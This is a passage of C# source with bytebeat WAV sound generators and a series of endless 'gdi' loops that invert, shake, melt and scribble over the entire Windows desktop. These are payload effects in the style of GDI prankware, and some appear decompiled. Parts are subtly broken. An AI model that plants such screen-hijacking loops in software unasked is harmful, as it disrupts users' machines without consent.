                soundstream1.Seek( 0, SeekOrigin.Begin );

                new SoundPlayer( soundstream1 ).PlaySync();

                {
                    return;
                }
            }
        }
        public static void Sound19()
        {
            using (var soundstream1 = new MemoryStream())
            {
                var soundwriter1 = new BinaryWriter( soundstream1 );

                soundwriter1.Write( "RIFF".ToCharArray() );  // chunk id
                soundwriter1.Write( (UInt32)0 );             // chunk size
                soundwriter1.Write( "WAVE".ToCharArray() );  // format

                soundwriter1.Write( "fmt ".ToCharArray() );  // chunk id
                soundwriter1.Write( (UInt32)16 );            // chunk size
                soundwriter1.Write( (UInt16)1 );             // audio format

                var channels = 1;
                var sample_rate = 8000;
                var bits_per_sample = 8;

                soundwriter1.Write( (UInt16)channels );
                soundwriter1.Write( (UInt32)sample_rate );
                soundwriter1.Write( (UInt32)(sample_rate * channels * bits_per_sample / 8) ); // byte rate
                soundwriter1.Write( (UInt16)(channels * bits_per_sample / 8) );               // block align
                soundwriter1.Write( (UInt16)bits_per_sample );

                soundwriter1.Write( "data".ToCharArray() );

                var seconds = 20;

                var data = new byte[sample_rate * seconds];

                for (int t = 0 ; t < data.Length ; t++)
                    data[t] = (byte)(
((t >> 9) + 42) * 23 * t - 100 + t >> 1 * 2 / 5 / t / t / t / t / t
                        );

                soundwriter1.Write( (UInt32)(data.Length * channels * bits_per_sample / 8) );

                foreach (var elt in data) soundwriter1.Write( elt );

                soundwriter1.Seek( 4, SeekOrigin.Begin );                     // seek to header chunk size field
                soundwriter1.Write( (UInt32)(soundwriter1.BaseStream.Length - 8) ); // chunk size

                soundstream1.Seek( 0, SeekOrigin.Begin );

                new SoundPlayer( soundstream1 ).PlaySync();

                {
                    return;
                }
            }
        }

        public static void Sound20()
        {
            using (var soundstream1 = new MemoryStream())
            {
                var soundwriter1 = new BinaryWriter( soundstream1 );

                soundwriter1.Write( "RIFF".ToCharArray() );  // chunk id
                soundwriter1.Write( (UInt32)0 );             // chunk size
                soundwriter1.Write( "WAVE".ToCharArray() );  // format

                soundwriter1.Write( "fmt ".ToCharArray() );  // chunk id
                soundwriter1.Write( (UInt32)16 );            // chunk size
                soundwriter1.Write( (UInt16)1 );             // audio format

                var channels = 1;
                var sample_rate = 8000;
                var bits_per_sample = 8;

                soundwriter1.Write( (UInt16)channels );
                soundwriter1.Write( (UInt32)sample_rate );
                soundwriter1.Write( (UInt32)(sample_rate * channels * bits_per_sample / 8) ); // byte rate
                soundwriter1.Write( (UInt16)(channels * bits_per_sample / 8) );               // block align
                soundwriter1.Write( (UInt16)bits_per_sample );

                soundwriter1.Write( "data".ToCharArray() );

                var seconds = 20;

                var data = new byte[sample_rate * seconds];

                for (int t = 0 ; t < data.Length ; t++)
                    data[t] = (byte)(
((t >> 9) + 42) * 23 * t - 100 + t >> 1 * 2 / 5 + t
                        );

                soundwriter1.Write( (UInt32)(data.Length * channels * bits_per_sample / 8) );

                foreach (var elt in data) soundwriter1.Write( elt );

                soundwriter1.Seek( 4, SeekOrigin.Begin );                     // seek to header chunk size field
                soundwriter1.Write( (UInt32)(soundwriter1.BaseStream.Length - 8) ); // chunk size

                soundstream1.Seek( 0, SeekOrigin.Begin );

                new SoundPlayer( soundstream1 ).PlaySync();

                {
                    return;
                }
            }
        }
        public static void Sound21()
        {
            using (var soundstream1 = new MemoryStream())
            {
                var soundwriter1 = new BinaryWriter( soundstream1 );

                soundwriter1.Write( "RIFF".ToCharArray() );  // chunk id
                soundwriter1.Write( (UInt32)0 );             // chunk size
                soundwriter1.Write( "WAVE".ToCharArray() );  // format

                soundwriter1.Write( "fmt ".ToCharArray() );  // chunk id
                soundwriter1.Write( (UInt32)16 );            // chunk size
                soundwriter1.Write( (UInt16)1 );             // audio format

                var channels = 1;
                var sample_rate = 8000;
                var bits_per_sample = 8;

                soundwriter1.Write( (UInt16)channels );
                soundwriter1.Write( (UInt32)sample_rate );
                soundwriter1.Write( (UInt32)(sample_rate * channels * bits_per_sample / 8) ); // byte rate
                soundwriter1.Write( (UInt16)(channels * bits_per_sample / 8) );               // block align
                soundwriter1.Write( (UInt16)bits_per_sample );

                soundwriter1.Write( "data".ToCharArray() );

                var seconds = 20;

                var data = new byte[sample_rate * seconds];

                for (int t = 0 ; t < data.Length ; t++)
                    data[t] = (byte)(
((t >> 5) + 42) * 23 * t - 10 + t >> 2 * 30 / 100
                        );

                soundwriter1.Write( (UInt32)(data.Length * channels * bits_per_sample / 8) );

                foreach (var elt in data) soundwriter1.Write( elt );

                soundwriter1.Seek( 4, SeekOrigin.Begin );                     // seek to header chunk size field
                soundwriter1.Write( (UInt32)(soundwriter1.BaseStream.Length - 8) ); // chunk size

                soundstream1.Seek( 0, SeekOrigin.Begin );

                new SoundPlayer( soundstream1 ).PlaySync();

                {
                    return;
                }
            }
        }
        public static void Sound22()
        {
            using (var soundstream1 = new MemoryStream())
            {
                var soundwriter1 = new BinaryWriter( soundstream1 );

                soundwriter1.Write( "RIFF".ToCharArray() );  // chunk id
                soundwriter1.Write( (UInt32)0 );             // chunk size
                soundwriter1.Write( "WAVE".ToCharArray() );  // format

                soundwriter1.Write( "fmt ".ToCharArray() );  // chunk id
                soundwriter1.Write( (UInt32)16 );            // chunk size
                soundwriter1.Write( (UInt16)1 );             // audio format

                var channels = 1;
                var sample_rate = 8000;
                var bits_per_sample = 8;

                soundwriter1.Write( (UInt16)channels );
                soundwriter1.Write( (UInt32)sample_rate );
                soundwriter1.Write( (UInt32)(sample_rate * channels * bits_per_sample / 8) ); // byte rate
                soundwriter1.Write( (UInt16)(channels * bits_per_sample / 8) );               // block align
                soundwriter1.Write( (UInt16)bits_per_sample );

                soundwriter1.Write( "data".ToCharArray() );

                var seconds = 20;

                var data = new byte[sample_rate * seconds];

                for (int t = 0 ; t < data.Length ; t++)
                    data[t] = (byte)(
((t >> 5) + 42) * 200 * t - 10 + t >> 2 + 100 / 12
                        );

                soundwriter1.Write( (UInt32)(data.Length * channels * bits_per_sample / 8) );

                foreach (var elt in data) soundwriter1.Write( elt );

                soundwriter1.Seek( 4, SeekOrigin.Begin );                     // seek to header chunk size field
                soundwriter1.Write( (UInt32)(soundwriter1.BaseStream.Length - 8) ); // chunk size

                soundstream1.Seek( 0, SeekOrigin.Begin );

                new SoundPlayer( soundstream1 ).PlaySync();

                {
                    return;
                }
            }
        }

        public static void FreezeSound()
        {
            using (var soundstream1 = new MemoryStream())
            {
                var soundwriter1 = new BinaryWriter( soundstream1 );

                soundwriter1.Write( "RIFF".ToCharArray() );  // chunk id
                soundwriter1.Write( (UInt32)0 );             // chunk size
                soundwriter1.Write( "WAVE".ToCharArray() );  // format

                soundwriter1.Write( "fmt ".ToCharArray() );  // chunk id
                soundwriter1.Write( (UInt32)16 );            // chunk size
                soundwriter1.Write( (UInt16)1 );             // audio format

                var channels = 1;
                var sample_rate = 8000;
                var bits_per_sample = 8;

                soundwriter1.Write( (UInt16)channels );
                soundwriter1.Write( (UInt32)sample_rate );
                soundwriter1.Write( (UInt32)(sample_rate * channels * bits_per_sample / 8) ); // byte rate
                soundwriter1.Write( (UInt16)(channels * bits_per_sample / 8) );               // block align
                soundwriter1.Write( (UInt16)bits_per_sample );

                soundwriter1.Write( "data".ToCharArray() );

                var seconds = 20;

                var data = new byte[sample_rate * seconds];



                for (int t = 0 ; t < data.Length ; t++)
                    data[t] = (byte)(
                         (t / 10) * 100 + 500
                        );

                soundwriter1.Write( (UInt32)(data.Length * channels * bits_per_sample / 8) );

                foreach (var elt in data) soundwriter1.Write( elt );

                soundwriter1.Seek( 4, SeekOrigin.Begin );                     // seek to header chunk size field
                soundwriter1.Write( (UInt32)(soundwriter1.BaseStream.Length - 8) ); // chunk size

                soundstream1.Seek( 0, SeekOrigin.Begin );

                new SoundPlayer( soundstream1 ).PlaySync();

                {
                    return;
                }
            }
        }
        public static void gdi1()
        {
            for ( ; ; )
            {
                Thread.Sleep( 50 );
                int w = GetSystemMetrics( 0 );
                int h = GetSystemMetrics( 1 );
                int x1 = rand() % (w - rand() % 1000);
                int y1 = rand() % (h - rand() % 1000);
                int x2 = rand() % (w - rand() % 1000);
                int y2 = rand() % (h - rand() % 1000);
                int width = rand() % rand() % 1000;
                int height = rand() % rand() % 1000;
                IntPtr hwnd = IntPtr.Zero;
                IntPtr hdc = GetDC( hwnd );
                BitBlt( hdc, x1, y1, width, height, hdc, x2, y2, TernaryRasterOperations.SRCCOPY );
                IntPtr color = CreateSolidBrush( (uint)(rand() % 1000) );
                SelectObject( hdc, color );
                BitBlt( hdc, 0, 0, w, h, hdc, 0, 0, TernaryRasterOperations.PATINVERT );
                if (gdi1_cancel == 1)
                {
                    gdi1_cancel = 0;
                    return;
                }
            }
        }
        public static void gdi2()
        {
            for ( ; ; )
            {
                IntPtr brush = CreateSolidBrush( (uint)(rand() % 1000) );
                DrawIconEx( hdc, rand() % x, rand() % y, LoadIcon( IntPtr.Zero, IDI_ERROR ), rand() % 200, rand() % 200, 0, IntPtr.Zero, rand() % 0x0010 );
                DrawIconEx( hdc, rand() % x, rand() % y, LoadIcon( IntPtr.Zero, IDI_WARNING ), rand() % 200, rand() % 200, 0, IntPtr.Zero, rand() % 0x0010 );
                DrawIconEx( hdc, rand() % x, rand() % y, LoadIcon( IntPtr.Zero, IDI_APPLICATION ), rand() % 200, rand() % 200, 0, IntPtr.Zero, rand() % 0x0010 );
                DrawIconEx( hdc, rand() % x, rand() % y, LoadIcon( IntPtr.Zero, IDI_INFORMATION ), rand() % 200, rand() % 200, 0, IntPtr.Zero, rand() % 0x0010 );
                DrawIconEx( hdc, rand() % x, rand() % y, LoadIcon( IntPtr.Zero, IDI_QUESTION ), rand() % 200, rand() % 200, 0, IntPtr.Zero, rand() % 0x0010 );

                SelectObject( hdc, brush );

                BitBlt( hdc, 0, 0, x, y, hdc, 0, 0, TernaryRasterOperations.PATINVERT );

                Sleep( 30 );

                if (gdi2_cancel == 1)
                {
                    gdi2_cancel = 0;
                    return;
                }
            }
        }
        public static void gdi3()
        {
            while (true)
            {
                IntPtr hwnd = GetDesktopWindow();
                IntPtr hdc = GetWindowDC( hwnd );
                hdc = GetWindowDC( hwnd );
                Random random = new Random();
                int screenW = Screen.PrimaryScreen.Bounds.Width;
                int screenH = Screen.PrimaryScreen.Bounds.Height;
                int redrawCounter = 0;
                int blockW = 300;
                int blockH = 300;
                int x = random.Next( 0, screenW - blockW );
                int y = random.Next( 0, screenH - blockH );
                BitBlt( hdc, random.Next( -100, 101 ), y, screenW, blockH, hdc, 0, y, (int)CopyPixelOperation.SourceCopy );
                BitBlt( hdc, x, random.Next( -100, 101 ), blockW, screenH, hdc, x, 0, (int)CopyPixelOperation.SourceCopy );
                redrawCounter++;
                if (redrawCounter >= 20)
                {
                    redrawCounter = 0;
                    RedrawWindow( IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.AllChildren | RedrawWindowFlags.Erase | RedrawWindowFlags.Invalidate );
                    IntPtr brush = CreateSolidBrush( (uint)random.Next( 0, 0xffffff + 1 ) );
                    SelectObject( hdc, brush );
                    PatBlt( hdc, 0, 0, screenW, screenH, TernaryRasterOperations.PATINVERT );
                    DeleteObject( brush );
                    IntPtr desktop = GetDC( IntPtr.Zero );
                    ReleaseDC( IntPtr.Zero, desktop );
                }
                System.Threading.Thread.Sleep( 10 );
                if (gdi3_cancel == 1)
                {
                    gdi3_cancel = 0;
                    return;
                }
            }
        }
        public static void gdi4()
        {

            while (true)
            {
                Thread.Sleep( 100 );
                IntPtr HWND_Desktop = GetDesktopWindow();
                IntPtr hdc = GetDC( HWND_Desktop );
                int screenLeft = Screen.PrimaryScreen.Bounds.Left;
                int screenTop = Screen.PrimaryScreen.Bounds.Top;
                int screenWidth = Screen.PrimaryScreen.Bounds.Width;
                int screenHeight = Screen.PrimaryScreen.Bounds.Height;
                Random randy = new Random();
                int rnd_pgm = randy.Next( 1 );

                int w = 1, h = 1;
                int b = 1;
                int a = randy.Next() % w; b = randy.Next() % h;
                BitBlt( hdc, a, b, screenWidth, screenHeight, hdc, a + randy.Next() % 21 - 10, b + randy.Next() % 21 - 10, TernaryRasterOperations.NOTSRCCOPY );
                ReleaseDC( HWND_Desktop, hdc );
                if (gdi4_cancel == 1)
                {
                    gdi4_cancel = 0;
                    return;
                }
            }
        }
        public static void gdi5()
        {
            while (true)
            {
                IntPtr hwnd = GetDesktopWindow();
                IntPtr hdc = GetWindowDC( hwnd );

                ReleaseDC( hwnd, hdc );

                var RGBQUAD = new RGBQUAD();

                int tymez = Environment.TickCount;

                int w = GetSystemMetrics( 0 ), h = GetSystemMetrics( 1 );
                IntPtr data = VirtualAlloc( IntPtr.Zero, (uint)((w * h + w) * Marshal.SizeOf( RGBQUAD )), (uint)(AllocationType.Commit | AllocationType.Reserve), (uint)MemoryProtection.ReadWrite );
                for (int i = 0 ; ; i++, i %= 3)
                {
                    if (i == 1) RedrawWindow( IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Solaris );
                    IntPtr dick = GetDC( IntPtr.Zero ), dickMem = CreateCompatibleDC( dick );
                    IntPtr bm = CreateBitmap( w, h, 1, 32, data );
                    SelectObject( dickMem, bm );
                    BitBlt( dickMem, 0, 0, w, h, dick, 0, 0, 0x330008 );
                    GetBitmapBits( bm, w * h * 4, data );
                    int v = 0;
                    int dfasdf = 0;
                    if ((Environment.TickCount - tymez) > 60000)
                        dfasdf = r.Next() & 0xff;
                    for (int i2 = 0 ; /* */ w * h > i2 ; i2++)
                    {
                        int data2 = data.ToInt32();
                        if (i2 % h == 0 && r.Next() % 100 == 0)
                            v = r.Next() % 50;
                        ((int*)(data2 + i2))[v % 3] += ((
                            int*)(data2 + i2 + v))[v] ^
                            dfasdf;
                    }
                    SetBitmapBits( bm, w * h * 4, data );
                    BitBlt( dick, r.Next() % 3 - 1, r.Next() % 3 - 1, w, h, dickMem, 0, 0, 0xCC0020 );
                    DeleteObject( bm );
                    DeleteObject( dickMem );
                    DeleteObject( dick );

                    if (gdi5_cancel == 1)
                    {
                        return;
                    }
                }
            }
        }
        public static void gdi6()
        {
            int wDest;
            int iVar1;
            IntPtr hdcDest;
            int hDest;

            wDest = GetSystemMetrics( 0 );
            iVar1 = GetSystemMetrics( 1 );
            hdcDest = GetDC( (IntPtr)0x0 );
            do
            {
                do
                {
                    hDest = 0;
                } while (iVar1 < 1);
                do
                {
                    StretchBlt( hdcDest, 0, 0, wDest, hDest, hdcDest, 0, 0, 1, 1, (TernaryRasterOperations)0x8800c6 );
                    Thread.Sleep( 1 );
                    hDest = hDest + 6;
                } while (hDest < iVar1);
                if (gdi6_cancel == 1)
                {
                    gdi6_cancel = 0;
                    return;
                }
            } while (true);
        }
        public static void gdi7()
        {
            for ( ; ; )
            {
                Graphics g = Graphics.FromHdc( hdc );

                Type cursorsType = typeof( Cursors );
                System.Reflection.PropertyInfo[] pros = cursorsType.GetProperties( System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
                foreach (System.Reflection.PropertyInfo pro in pros)
                {
                    Point drawPoint = new Point( rand() % x, rand() % y );
                    Cursor cur = (Cursor)pro.GetValue( null, null );
                    cur.Draw( g, new Rectangle( drawPoint, cur.Size ) );

                    Thread.Sleep( 10 );
                    if (gdi7_cancel == 1)
                    {
                        gdi7_cancel = 0;
                        return;
                    }
                }
            }
        }
        public static void gdi8()
        {
            Random rand = new Random();
            IntPtr desk = GetDC( IntPtr.Zero );

            int xs2 = GetSystemMetrics( SM_CXSCREEN ), ys2 = GetSystemMetrics( SM_CYSCREEN );

            for ( ; ; )
            {
                Thread.Sleep( 1 );
                if (rand.Next() % 3 == 2)
                {
                    Color c = Color.FromArgb( rand.Next() % 255, rand.Next() % 255, rand.Next() % 255 );
                    IntPtr brush = CreateSolidBrush( (uint)ColorTranslator.ToWin32( c ) );
                    SelectObject( desk, brush );
                    PatBlt( desk, 0, 0, xs2, ys2, TernaryRasterOperations.PATINVERT );
                    Thread.Sleep( rand.Next() % 1000 );
                }
                else if (rand.Next() % 3 == 1)
                {
                    Color c = Color.FromArgb( rand.Next() % 75, rand.Next() % 75, rand.Next() % 75 );
                    IntPtr brush = CreateSolidBrush( (uint)ColorTranslator.ToWin32( c ) );
                    SelectObject( desk, brush );
                    PatBlt( desk, 0, 0, xs2, ys2, TernaryRasterOperations.PATINVERT );
                    Thread.Sleep( rand.Next() % 1000 );
                }

                if (rand.Next() % 25 == 9)
                {
                    Color c = Color.FromArgb( rand.Next() % 255, rand.Next() % 255, rand.Next() % 255 );
                    IntPtr brush = CreateSolidBrush( (uint)ColorTranslator.ToWin32( c ) );
                    SelectObject( desk, brush );

                    Thread.Sleep( 10 );
                }
                else if (rand.Next() % 25 == 5)
                {
                    Color c = Color.FromArgb( rand.Next() % 205, rand.Next() % 205, rand.Next() % 205 );
                    IntPtr brush = CreateSolidBrush( (uint)ColorTranslator.ToWin32( c ) );
                    SelectObject( desk, brush );
                }


                if (rand.Next() % 2 == 1)
                {
                    LineTo( desk, rand.Next() % xs2, rand.Next() % ys2 );
                    RoundRect( desk, rand.Next() % xs2, rand.Next() % ys2, rand.Next() % xs2, rand.Next() % ys2, rand.Next() % xs2, rand.Next() % ys2 );
                    Thread.Sleep( 10 );
                }


                if (rand.Next() % 2 == 1)
                {
                    LineTo( desk, rand.Next() % xs2, rand.Next() % ys2 );
                    RoundRect( desk, rand.Next() % xs2, rand.Next() % ys2, rand.Next() % xs2, rand.Next() % ys2, rand.Next() % xs2, rand.Next() % ys2 );
                    Thread.Sleep( 10 );
                }
                else if (rand.Next() % 2 == 2)
                {
                    int x3 = GetSystemMetrics( SM_CXSCREEN );
                    int y3 = GetSystemMetrics( SM_CYSCREEN );
                    IntPtr hdc2 = GetDC( IntPtr.Zero );
                    int r1 = rand.Next() % x2;
                    int r2 = rand.Next() % y2;
                    Color c = Color.FromArgb( rand.Next() % 255, rand.Next() % 255, rand.Next() % 255 );
                    IntPtr hbrush1 = CreateSolidBrush( (uint)ColorTranslator.ToWin32( c ) );
                    SelectObject( hdc2, hbrush1 );
                    StretchBlt( hdc2, 0, 0, x3, r1, hdc2, r1, r2, 1, 1, TernaryRasterOperations.PATINVERT );
                }



                if (rand.Next() % 7 == 5)
                {
                    Color c = Color.FromArgb( rand.Next() % 255, rand.Next() % 255, rand.Next() % 255 );
                    StretchBlt( desk, rand.Next() % xs2, rand.Next() % ys2, xs2, ys2, desk, 0, 0, xs2, ys2, TernaryRasterOperations.SRCCOPY );
                    StretchBlt( desk, 10, 10, xs2 - 20, ys2 - 20, desk, 0, 0, xs2, ys2, TernaryRasterOperations.SRCPAINT );
                    StretchBlt( desk, -10, -10, xs2 + 20, ys2 + 20, desk, 0, 0, xs2, ys2, TernaryRasterOperations.SRCPAINT );
                    StretchBlt( desk, 0, 0, xs2, ys2, desk, rand.Next() % xs2, rand.Next() % ys2, xs2, ys2, TernaryRasterOperations.SRCINVERT );
                    IntPtr hbrush2 = CreateSolidBrush( (uint)ColorTranslator.ToWin32( c ) );
                    SelectObject( desk, hbrush2 );
                    PatBlt( desk, 0, 0, xs2, ys2, TernaryRasterOperations.PATINVERT );
                }

                IntPtr hbrush = CreateSolidBrush( (uint)rand.Next( 0xFFFFFF ) );
                SelectObject( desk, hbrush );
                BitBlt( desk, rand.Next() % 10, rand.Next() % 10, xs2, ys2, desk, rand.Next() % 10, rand.Next() % 10, 0x98123c );

                if (gdi8_cancel == 1)
                {
                    gdi8_cancel = 0;
                    return;
                }
            }
        }
        public static void gdi9()
        {
            Random rand = new Random();
            while (true)
            {
                IntPtr hdcScreen = GetDC( IntPtr.Zero );
                int cx = GetSystemMetrics( 0 );
                int cy = GetSystemMetrics( 1 );
                int t = rand.Next() % 10;
                BitBlt( hdcScreen, 0, 0, cx, cy, hdcScreen, 0 + t % cx, 0 + t % cy, TernaryRasterOperations.NOTSRCERASE );
                Color c = Color.FromArgb( rand.Next() % 256, rand.Next() % 256, rand.Next() % 256 );
                IntPtr brush = CreateSolidBrush( (uint)ColorTranslator.ToWin32( c ) );
                SelectObject( hdcScreen, brush );
                PatBlt( hdcScreen, 0, 0, cx, cy, TernaryRasterOperations.PATINVERT );
                Thread.Sleep( 15 );
                if (gdi9_cancel == 1)
                {
                    gdi9_cancel = 0;
                    return;
                }
            }
        }
        public static void gdi10()
        {
            Random rand = new Random();
            while (true)
            {
                StretchBlt( hdc, 1, r.Next( 10 ), x, y, hdc, 1, r.Next( 10 ), x, y, TernaryRasterOperations.SRCCOPY );
                if (gdi10_cancel == 1)
                {
                    gdi10_cancel = 0;
                    return;
                }
            }
        }

        public static void gdi11()
        {
            for ( ; ; )
            {
                BitBlt( hdc, 500, 0, x, y, hdc, 0, 0, TernaryRasterOperations.SRCCOPY );
                BitBlt( hdc, -500, 0, x, y, hdc, 0, y / 4, TernaryRasterOperations.SRCCOPY );

                Thread.Sleep( 100 );

                if (gdi11_cancel == 1)
                {
                    gdi11_cancel = 0;
                    return;
                }
            }
        }

        public static void gdi12()
        {
            while (true)
            {
                IntPtr hcdc = CreateCompatibleDC( hdc );
                IntPtr hBitmap = CreateCompatibleBitmap( hdc, x, y );
                SelectObject( hcdc, hBitmap );
                BitBlt( hcdc, 0, 0, x, y, hdc, 0, 0, TernaryRasterOperations.SRCCOPY );

                _BLENDFUNCTION blf = new _BLENDFUNCTION();
                blf.BlendOp = AC_SRC_OVER;
                blf.BlendFlags = 0;
                blf.SourceConstantAlpha = (byte)(rand() % 255);
                blf.AlphaFormat = 0;

                AlphaBlend( hdc, 0, 0, GetSystemMetrics( 0 ) - rand() % GetSystemMetrics( 0 ), GetSystemMetrics( 1 ) - rand() % GetSystemMetrics( 1 ), hcdc, 0, 0, GetSystemMetrics( 0 ) - rand() % GetSystemMetrics( 0 ), GetSystemMetrics( 1 ) - rand() % GetSystemMetrics( 1 ), blf );

                Thread.Sleep( 20 );

                if (gdi12_cancel == 1)
                {
                    gdi12_cancel = 0;
                    return;
                }
            }
        }
        public static void gdi13()
        {
            while (true)
            {
                int t = rand();
                int x = rand() % GetSystemMetrics( 0 );
                int y = rand() % GetSystemMetrics( 1 );
                BitBlt( hdc, x, y, t % GetSystemMetrics( 0 ), t % GetSystemMetrics( 1 ), hdc, (x + t / 2) % GetSystemMetrics( 0 ), y % GetSystemMetrics( 0 ), TernaryRasterOperations.SRCCOPY );

                if (gdi13_cancel == 1)
                {
                    gdi13_cancel = 0;
                    return;
                }
            }
        }
        public static void gdi14()
        {
            while (true)
            {
                IntPtr desk = GetDC( IntPtr.Zero );
                IntPtr wnd = GetDesktopWindow();
                int w = GetSystemMetrics( 0 ), h = GetSystemMetrics( 1 );

                float angle = 1;
                while (true)
                {
                    desk = GetDC( IntPtr.Zero );
                    for (float i = 0 ; i < w + h ; i += 120f)
                    {
                        int a = (int)(Sin2( angle ) * PI * 10);
                        BitBlt( desk, (int)i, 0, 20, h, desk, (int)i, a, TernaryRasterOperations.SRCCOPY );
                        angle += PI / 100;
                        DeleteObject( (IntPtr)i ); DeleteObject( (IntPtr)a );
                    }
                    ReleaseDC( wnd, desk );
                    DeleteDC( desk );
                    DeleteObject( (IntPtr)w );
                    DeleteObject( (IntPtr)h );
                    DeleteObject( (IntPtr)angle );

                    if (gdi14_cancel == 1)
                    {
                        gdi14_cancel = 0;
                        return;
                    }
                }
            }
        }

        public static void gdi15()
        {
            while (true)
            {
                int t = 0;

                IntPtr hdcScreen = GetDC( IntPtr.Zero );

                int cx = GetSystemMetrics( 0 );
                int cy = GetSystemMetrics( 1 );

                IntPtr hcdc = CreateCompatibleDC( hdcScreen );
                IntPtr hBitmap = CreateCompatibleBitmap( hdcScreen, cx, cy );
                SelectObject( hcdc, hBitmap );
                BitBlt( hcdc, 0, 0, cx, cy, hdcScreen, 0, 0, TernaryRasterOperations.SRCCOPY );

                POINT p;
                p.x = (cx / 2);
                p.y = (cy / 2);

                _BLENDFUNCTION blf;
                blf.BlendOp = AC_SRC_OVER;
                blf.BlendFlags = 0;
                blf.SourceConstantAlpha = 128;
                blf.AlphaFormat = 0;

                if (t % 2 == 0)
                {
                    RotateDC( hdcScreen, 1, p );
                }
                else
                {
                    RotateDC( hdcScreen, -1, p );
                }

                AlphaBlend( hdcScreen, 0, 0, cx, cy, hcdc, 0, 0, cx, cy, blf );

                DeleteObject( hcdc );
                DeleteObject( hBitmap );
                Sleep( 1 );

                if (gdi15_cancel == 1)
                {
                    gdi15_cancel = 0;
                    return;
                }
            }
        }
        public static void gdi16_1()
        {
            int right;
            int iVar2;
            int iVar3;
            IntPtr hdc;
            uint uVar4 = 0;
            uint uVar5 = 0;
            uint uVar6 = 0;
            IntPtr h;
            int left;
            int local_8;

            iVar2 = GetSystemMetrics( 0 );
            iVar3 = GetSystemMetrics( 1 );
            hdc = GetDC( IntPtr.Zero );
            local_8 = 0;
            do
            {
                h = CreateSolidBrush( ((uint)((ulong)(uVar6 << 5 ^ uVar6) * 0x8080808081 >> 0x27) & 0xff) <<
                    0x10 | (uVar5 / 0xff + uVar5 & 0xff) << 8 | uVar4 / 0xff + uVar4 & 0xff );
                SelectObject( hdc, h );
                if (0 < iVar2)
                {
                    left = 0;
                    do
                    {
                        right = left + 100;
                        Rectangle( hdc, left, local_8 + 100, right, local_8 );
                        Thread.Sleep( 10 );
                        left = right;
                    } while (right < iVar2);
                }
                local_8 = local_8 + 100;
                if (iVar3 <= local_8)
                {
                    local_8 = 0;
                }
                Thread.Sleep( 0x1e );
                if (gdi16_1_cancel == 1)
                {
                    gdi16_1_cancel = 0;
                    return;
                }
            } while (true);
        }
        public static void gdi16_2()
        {
            IntPtr hdcDest;
            IntPtr pHVar2;
            RECT ptVar3;
            int local_38;
            RECT local_34 = new RECT();
            POINT local_24;
            int local_1c;
            int local_18;
            int local_14;
            int local_10;

            GetSystemMetrics( 0 );
            GetSystemMetrics( 1 );
            hdcDest = GetDC( (IntPtr)0x0 );
            do
            {
                while ((1) != 0)
                {
                    local_38 = 0x1e;
                    do
                    {
                        ptVar3 = local_34;
                        pHVar2 = GetDesktopWindow();
                        GetWindowRect( pHVar2, out ptVar3 );
                        local_24.x = local_34.left + -0x5a;
                        local_24.y = local_34.top + 0x5a;
                        local_1c = local_34.right + -0x5a;
                        local_18 = local_34.top + -0x5a;
                        local_14 = local_34.left + 0x5a;
                        local_10 = local_34.bottom + 0x5a;
                        PlgBlt( hdcDest, local_24, hdcDest, 0, 0, local_34.right - local_34.left,
                           local_34.bottom - local_34.top, (IntPtr)0x0, 0, 0 );
                        local_38 = local_38 + -1;
                    } while (local_38 != 0);

                    do
                    {
                        ptVar3 = local_34;
                        pHVar2 = GetDesktopWindow();
                        GetWindowRect( pHVar2, out ptVar3 );
                        local_24.x = local_34.left + 0x5a;
                        local_24.y = local_34.top + -0x5a;
                        local_1c = local_34.right + 0x5a;
                        local_18 = local_34.top + 0x5a;
                        local_14 = local_34.left + -0x5a;
                        local_10 = local_34.bottom + -0x5a;
                        PlgBlt( hdcDest, local_24, hdcDest, 0, 0, local_34.right - local_34.left,
                           local_34.bottom - local_34.top, (IntPtr)0x0, 0, 0 );
                        local_38 = local_38 + -1;
                    } while (local_38 != 0);
                    if (gdi16_2_cancel == 1)
                    {
                        gdi16_2_cancel = 0;
                        return;
                    }
                }
            } while (true);
        }
        public static void gdi16_3()
        {
            int uVar1 = 0;
            int uVar2;
            int cy;
            IntPtr hdc;
            int uVar3;
            int uVar4;

            uVar2 = GetSystemMetrics( 0 );
            cy = GetSystemMetrics( 1 );
            hdc = GetDC( (IntPtr)0x0 );
            do
            {
                uVar3 = uVar1 ^ uVar1 << 0xd;
                uVar3 = uVar3 ^ uVar3 << 0x11;
                uVar3 = (uVar3 << 5 ^ uVar3) % uVar2;
                uVar4 = uVar1 ^ uVar1 << 0xd;
                uVar4 = uVar4 ^ uVar4 << 0x11;
                uVar4 = uVar4 ^ uVar4 << 5;
                BitBlt( hdc, (int)uVar3, 0, 100, cy, hdc, (int)uVar3, (int)(uVar4 + uVar4 * 0x124924925 >> 0x21 & 0xfffffff8 - uVar4 / 0xe - 2 + -5), 0xee0086 );
                if (gdi16_3_cancel == 1)
                {
                    gdi16_3_cancel = 0;
                    return;
                }
            } while (true);
        }
        public static void gdi16_4()
        {
            int uVar1 = 0;
            ulong uVar2 = 0;
            int cx;
            int cy;
            IntPtr hdc;
            IntPtr pHVar3;
            uint uVar4;
            int x1;
            int uVar5;
            int iVar6;
            int local_14;

            cx = GetSystemMetrics( 0 );
            cy = GetSystemMetrics( 1 );
            hdc = GetDC( (IntPtr)0x0 );
        LAB_00403140:
            do
            {
                uVar4 = (uint)(uVar1 ^ uVar1 << 0xd);
                uVar4 = uVar4 ^ uVar4 << 0x11;
                x1 = (int)((uVar4 << 5 ^ uVar4) % cx);
                uVar4 = (uint)(uVar1 ^ uVar1 << 0xd);
                uVar4 = uVar4 ^ uVar4 << 0x11;
                uVar5 = (int)((uVar4 << 5 ^ uVar4) % cy);
                uVar4 = (uint)(uVar1 ^ uVar1 << 0xd);
                uVar4 = uVar4 ^ uVar4 << 0x11;
                uVar4 = (uVar4 ^ uVar4 << 5) % 600;
                if ((uVar2 & 1) == 0)
                {
                    if (uVar4 != 0xfffffe0c)
                    {
                        iVar6 = uVar5 - x1;
                        local_14 = (int)((uVar4 + 499) / 0x1e + 1);
                        uVar4 = (uint)x1;
                        do
                        {
                            pHVar3 = CreateEllipticRgn( x1, iVar6 + x1, (int)uVar4, (int)(iVar6 + uVar4) );
                            SelectClipRgn( hdc, pHVar3 );
                            BitBlt( hdc, 0, 0, cx, cy, hdc, 0, 0, 0x330008 );
                            Thread.Sleep( 1 );
                            uVar4 = uVar4 + 0x1e;
                            x1 = x1 - 0x1e;
                            local_14 = local_14 + -1;
